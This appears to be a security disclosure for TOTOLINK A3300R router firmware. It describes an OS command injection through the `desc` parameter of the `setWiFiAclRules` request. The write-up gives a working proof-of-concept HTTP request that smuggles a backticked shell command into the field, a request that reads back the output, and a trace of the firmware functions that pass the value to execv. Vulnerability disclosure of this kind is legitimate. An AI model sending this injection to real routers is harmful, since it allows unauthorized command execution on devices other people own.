# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/7/img/image-20240109124617070.png)

## Vulnerability Description

When deal with  `setWiFiAclRules` request,`desc` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1
Host: 192.168.0.1
Content-Length: 130
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/advance/acl.html?token=C6F41C563E86A379
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: uid=eER8ohUW; PrivateKey=73756ACCDA18C09131DFDF6F7C5AA16B; timeout=2
Connection: close

{"mac":"14:16:9E:CC:BB:3F","desc":"funny-mud-peee`ls>/web/cmdi15.txt`","addEffect":"1","wifiIdx":"0","topicurl":"setWiFiAclRules"}
```

injection the command "ls>/web/cmdi15.txt"

![b0870a83252c01cad4f1774f3961469](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/15/img/b0870a83252c01cad4f1774f3961469.png)

check the result.

```
GET /cmdi15.txt HTTP/1.1
Host: itotolink.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

```

![46f04bf4acc9820a9576fd78c1b6857](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/15/img/46f04bf4acc9820a9576fd78c1b6857.png)

## Analysis

sub_4217E0 will handle the `setWiFiAclRules` request. sub_4217E0 get `desc` parameter from request body, then pass to `Uci_Set_Str` function.

![image-20240119144150895](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/15/img/image-20240119144150895.png)

`Uci_Set_Str` function Splicing uci command, and pass to `CsteSystem` function.

![image-20240109131204077](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/8/img/image-20240109131204077.png)

`CsteSystem` wraps the command and then passes it to `execv` to execute the command.

![image-20240109131330610](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/8/img/image-20240109131330610.png)

